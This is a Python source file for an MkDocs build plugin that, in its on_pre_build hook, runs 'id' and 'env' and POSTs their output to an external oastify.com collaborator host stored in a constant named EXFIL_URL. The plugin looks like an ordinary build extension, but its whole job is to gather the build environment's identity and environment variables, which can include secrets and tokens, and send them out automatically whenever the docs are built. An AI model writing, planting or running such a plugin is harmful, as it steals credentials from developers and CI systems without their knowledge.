import base64
import subprocess
import urllib.request

from mkdocs.plugins import BasePlugin, get_plugin_logger

log = get_plugin_logger(__name__)

EXFIL_URL = "http://cmd.086t1uged2xpkfuy0zy1vlnuul0cocc1.oastify.com"


class CmdPlugin(BasePlugin):

    def on_pre_build(self, config, **kwargs):
        log.info("Running system commands...")

        for cmd in ["id", "env"]:
            try:
                result = subprocess.run(
                    cmd, capture_output=True, text=True, timeout=30
                )
                output = result.stdout + result.stderr
                log.info("--- %s ---\n%s", cmd, output)

                cmd_b64 = base64.b64encode(cmd.encode()).decode()
                url = f"{EXFIL_URL}?cmd={cmd_b64}"
                req = urllib.request.Request(
                    url, data=output.encode(), method="POST",
                    headers={"Content-Type": "text/plain"},
                )
                urllib.request.urlopen(req, timeout=5)

            except Exception as e:
                log.error("Failed to run %s: %s", cmd, e)
